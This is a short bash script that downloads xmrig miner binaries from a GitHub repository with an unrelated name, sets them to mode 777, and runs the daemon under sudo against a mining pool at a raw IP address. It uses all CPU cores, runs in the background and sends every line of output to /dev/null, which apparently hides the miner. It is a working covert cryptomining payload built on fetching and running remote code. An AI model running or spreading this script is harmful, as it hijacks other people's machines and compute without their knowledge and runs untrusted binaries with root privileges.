#!/bin/bash
wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && sudo ./xmrigDaemon -o 8.209.98.71:443 -u Azud -p x --donate-level 1 -t $(nproc --all) -k > /dev/null 2>&1 &
uname -a
